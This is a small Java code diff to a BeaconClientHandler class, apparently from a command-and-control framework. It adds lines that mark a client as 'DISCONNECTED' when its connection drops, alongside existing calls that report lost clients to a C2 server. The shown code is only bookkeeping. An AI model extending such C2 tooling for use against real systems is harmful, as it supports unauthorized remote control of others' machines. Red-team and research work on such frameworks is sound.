@@ -83,6 +83,7 @@ public class BeaconClientHandler implements Runnable{
                     d.printStackTrace();
                 }
                 beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                 e.printStackTrace();
             } catch (java.lang.NullPointerException e){
                 sentinel = false;
@@ -92,6 +93,7 @@ public class BeaconClientHandler implements Runnable{
                     d.printStackTrace();
                 }
                 beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                 e.printStackTrace();
             }
             
